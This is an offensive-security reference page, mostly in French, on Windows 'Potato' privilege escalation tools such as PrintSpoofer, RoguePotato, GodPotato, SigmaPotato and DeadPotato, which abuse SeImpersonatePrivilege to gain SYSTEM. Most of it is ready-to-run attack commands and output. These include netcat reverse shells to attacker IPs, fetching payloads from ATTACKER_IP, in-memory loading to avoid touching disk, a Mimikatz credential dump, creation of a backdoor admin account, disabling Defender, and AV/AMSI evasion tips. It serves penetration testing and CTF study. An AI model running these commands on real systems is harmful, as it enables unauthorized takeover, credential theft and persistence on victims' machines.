# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et versions ultérieures. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** peuvent être utilisés pour **obtenir les mêmes privilèges et atteindre `NT AUTHORITY\SYSTEM`** au niveau d'accès. Ce [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) explique en détail l'outil `PrintSpoofer`, qui peut être utilisé pour abuser des privilèges d'impersonation sur des hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.

> [!TIP]
> Une alternative moderne fréquemment maintenue en 2024–2025 est SigmaPotato (un fork de GodPotato) qui ajoute l'utilisation en mémoire / reflection .NET et un support OS étendu. Voir l'utilisation rapide ci‑dessous et le repo dans References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Exigences et pièges courants

Toutes les techniques suivantes reposent sur l'abus d'un service privilégié capable d'impersonation depuis un contexte possédant l'un des privilèges suivants :

- SeImpersonatePrivilege (le plus courant) ou SeAssignPrimaryTokenPrivilege
- Un niveau d'intégrité élevé n'est pas requis si le token dispose déjà de SeImpersonatePrivilege (typique pour de nombreux comptes de service tels que IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Notes opérationnelles :

- Si votre shell s'exécute sous un token restreint sans SeImpersonatePrivilege (fréquent pour Local Service/Network Service dans certains contextes), récupérez les privilèges par défaut du compte en utilisant FullPowers, puis lancez un Potato. Exemple : `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer nécessite que le service Print Spooler soit en cours d'exécution et accessible via le endpoint RPC local (spoolss). Dans des environnements durcis où Spooler est désactivé après PrintNightmare, préférez RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiert un résolveur OXID accessible sur TCP/135. Si la sortie réseau est bloquée, utilisez un redirector/port-forwarder (voir exemple ci-dessous). Les anciennes versions nécessitaient le flag -f.
- EfsPotato/SharpEfsPotato exploitent MS-EFSR ; si une pipe est bloquée, essayez des pipes alternatives (lsarpc, efsrpc, samr, lsass, netlogon).
- L'erreur 0x6d3 lors de RpcBindingSetAuthInfo indique généralement un service d'authentification RPC inconnu/non pris en charge ; essayez une pipe/transport différent ou vérifiez que le service cible est en cours d'exécution.
- Des forks “kitchen-sink” tels que DeadPotato embarquent des modules de payload supplémentaires (Mimikatz/SharpHound/Defender off) qui touchent le disque ; attendez-vous à une détection EDR plus élevée comparée aux originaux allégés.

## Démonstration rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Remarques:
- Vous pouvez utiliser -i pour lancer un processus interactif dans la console actuelle, ou -c pour exécuter une commande en une seule ligne.
- Nécessite le service Spooler. S'il est désactivé, cela échouera.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si le port 135 sortant est bloqué, pivotez l'OXID resolver via socat sur votre redirector :
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato est une nouvelle primitive d'abus COM publiée fin 2022 qui cible le service **PrintNotify** au lieu de Spooler/BITS. Le binaire instancie le serveur COM PrintNotify, remplace l'`IUnknown` par un faux, puis déclenche un callback privilégié via `CreatePointerMoniker`. Lorsque le service PrintNotify (s'exécutant en tant que **SYSTEM**) se reconnecte, le processus duplique le token retourné et lance la charge utile fournie avec tous les privilèges.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Nécessite que le contexte appelant possède **SeImpersonatePrivilege** (typique pour les comptes de service IIS APPPOOL, MSSQL et des tâches planifiées).
* Accepte soit une commande directe soit un mode interactif pour rester dans la console d'origine. Exemple:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Parce qu'il est purement COM-based, aucun named-pipe listener ni external redirector n'est requis, ce qui en fait un remplacement plug-and-play sur les hôtes où Defender bloque le RPC binding de RoguePotato.

Des opérateurs tels qu'Ink Dragon lancent PrintNotifyPotato immédiatement après avoir obtenu un ViewState RCE sur SharePoint pour pivoter du worker `w3wp.exe` vers SYSTEM avant d'installer ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Astuce : Si un pipe échoue ou si EDR le bloque, essayez les autres pipes pris en charge :
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Remarques :
- Fonctionne sur Windows 8/8.1–11 et Server 2012–2022 lorsque SeImpersonatePrivilege est présent.
- Récupérez le binaire qui correspond au runtime installé (p. ex., `GodPotato-NET4.exe` sur un Server 2022 moderne).
- Si votre primitive d'exécution initiale est une webshell/UI avec des délais d'expiration courts, placez le payload en tant que script et demandez à GodPotato de l'exécuter au lieu d'une longue commande inline.

Modèle de staging rapide depuis un webroot IIS accessible en écriture :
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fournit deux variantes ciblant des objets DCOM de service qui par défaut utilisent RPC_C_IMP_LEVEL_IMPERSONATE. Compilez ou utilisez les binaries fournis et exécutez votre commande :
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork GodPotato mis à jour)

SigmaPotato ajoute des améliorations modernes comme l'exécution en mémoire via .NET reflection et un PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Avantages supplémentaires dans les builds 2024–2025 (v1.2.x) :

- Drapeau reverse shell intégré `--revshell` et suppression de la limite PowerShell de 1024 caractères, vous permettant de lancer de longs AMSI-bypassing payloads en une seule fois.
- Syntaxe compatible reflection (`[SigmaPotato]::Main()`), plus une astuce rudimentaire d'évasion AV via `VirtualAllocExNuma()` pour tromper des heuristiques simples.
- Un `SigmaPotatoCore.exe` séparé compilé contre .NET 2.0 pour les environnements PowerShell Core.

### DeadPotato (reprise 2024 de GodPotato avec modules)

DeadPotato conserve la chaîne d'usurpation OXID/DCOM de GodPotato, mais intègre des helpers post-exploitation pour que les opérateurs puissent immédiatement obtenir SYSTEM et effectuer persistence/collection sans outils supplémentaires.

Modules courants (tous requièrent SeImpersonatePrivilege) :

- `-cmd "<cmd>"` — exécuter une commande arbitraire en tant que SYSTEM.
- `-rev <ip:port>` — reverse shell rapide.
- `-newadmin user:pass` — créer un administrateur local pour persistence.
- `-mimi sam|lsa|all` — déposer et exécuter Mimikatz pour dump credentials (touche le disque, bruyant).
- `-sharphound` — exécuter la collection SharpHound en tant que SYSTEM.
- `-defender off` — désactiver la protection en temps réel de Defender (très bruyant).

Exemples de one-liners :
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Comme il fournit des binaires supplémentaires, attendez-vous à davantage de détections par les AV/EDR ; utilisez les versions plus légères GodPotato/SigmaPotato lorsque la furtivité est importante.

## Références

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
